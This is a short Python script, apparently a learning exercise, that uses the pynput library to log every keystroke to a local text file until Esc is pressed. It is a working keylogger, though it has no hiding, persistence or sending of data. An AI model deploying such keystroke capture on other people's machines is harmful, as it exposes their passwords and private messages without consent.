#input the lib
from pynput import keyboard
import os

file = open("test.txt", "a")


def on_press(key):
    '''check pressed keys, AttributeError is for special keys'''
    try:
        file.write(key.char)
        file.flush()
        os.fsync(file.fileno())

    except AttributeError:
        file.write('{0}'.format(key))
        file.flush()
        os.fsync(file.fileno())

def on_release(key):
    '''if that keys pressed go to a new line, if esc than stop a program and save changes'''
    if key == keyboard.Key.space:
        file.write("\n")
        file.flush()
        os.fsync(file.fileno())

    if key == keyboard.Key.enter:
        file.write("\n")
        file.flush()
        os.fsync(file.fileno())

    if key == keyboard.Key.esc:
        file.write("\n")
        file.flush()
        os.fsync(file.fileno())
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()



file.close()

